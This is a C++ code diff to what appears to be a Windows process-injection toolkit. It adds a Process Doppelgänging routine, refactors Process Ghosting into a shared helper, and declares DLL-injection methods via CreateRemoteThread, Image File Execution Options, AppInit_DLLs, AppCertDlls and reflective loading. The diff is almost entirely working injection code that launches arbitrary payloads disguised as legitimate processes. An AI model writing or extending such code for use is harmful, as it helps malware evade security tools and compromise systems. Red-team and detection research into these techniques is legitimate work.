@@ -10,7 +10,7 @@
 #include <string>
 #include <DbgHelp.h>
 #include <userenv.h>
-
+#include <ktmw32.h>
 #include "Utiliti.h"
 
 using namespace std;
@@ -18,6 +18,8 @@ using namespace std;
 #pragma comment(lib, "Dbghelp.lib")
 #pragma comment(lib, "Ntdll.lib")
 #pragma comment(lib, "Userenv.lib")
+#pragma comment(lib, "KtmW32.lib")
+
 
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName);
@@ -32,9 +34,10 @@ DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourcePr
 DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName);
 DWORD InjectUsingAppCertDlls(WCHAR* DLLName);
 DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath);
-
-
+DWORD WINAPI InjectUsingProcessDoppelGanging(WCHAR* TargetProcessName, WCHAR* PayloadPath);
 DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath);
+
+
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
 
@@ -622,49 +625,15 @@ DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* Payload
 	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
 		return -1;
 	}
-
-	HANDLE hProcess = nullptr;
-	NTSTATUS status = fnNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
-	if (status != 0) {
-		printf("Failed in NtCreateProcessEx Error Code 0x%x\n " , GetLastError());
-		if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
-			printf("[!] Failed The payload has mismatching bitness\n ");
-		}
-		return -1;
-	}
-
-	PROCESS_BASIC_INFORMATION pi = {0};
-
-	DWORD ReturnLength = 0;
-	status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pi, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);
-	if (status!=0) {
-		printf("Failed in NtQueryInformationProcess Error Code 0x%x\n ", GetLastError());
-		return -1;
-	}
-	PEBmy* PebCopy = ReadRemotePEB(hProcess);
-
-	ULONGLONG imageBase = (ULONGLONG)PebCopy->ImageBaseAddress;
-
-	DWORD payloadEntryPointRVA = GetEntryPointRVA(PayloadData);
-	ULONGLONG procEntry = payloadEntryPointRVA + imageBase;
-
-
-	if (SetProcessParametar(hProcess, pi, TargetProcessName) == -1) {
-		printf("Failed in setuping Parameters Error Code 0x%x\n ", GetLastError());
-		return -1;
-	}
-
-	HANDLE hThread = NULL;
-	status = fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)procEntry, NULL, FALSE, 0, 0, 0, NULL);
-	if (status != 0) {
-		printf("Failed in NtCreateThreadEx Error Code 0x%x\n ", GetLastError());
+	
+	DWORD Status = CreateProcessFromSecion(hSection, PayloadData, TargetProcessName);
+	if (Status == -1) {
 		return -1;
 	}
 
 	return 0;
 
 }
-
 
 // your Dll Should Depend on Kernel32 and ntdll.dll only (for stability, you can resolve all the API you need using GetProcAddress and LoadLibrary)
 DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath) {
@@ -717,6 +686,24 @@ DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath) {
 
 	if (hProcess)
 		CloseHandle(hProcess);
+
+	return 0;
+}
+
+DWORD WINAPI InjectUsingProcessDoppelGanging(WCHAR* TargetProcessName, WCHAR* PayloadPath) {
+
+	BYTE* PayloadData = ReadDataFromFile(PayloadPath);
+
+	DWORD PayloadSize = GetSizeOfFile(PayloadPath);
+
+	HANDLE hSection = MakeTransactedSection(TargetProcessName, PayloadData, PayloadSize);
+	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
+		return -1;
+	}
+	DWORD Status = CreateProcessFromSecion(hSection, PayloadData, TargetProcessName);
+	if (Status == -1) {
+		return -1;
+	}
 
 	return 0;
 }
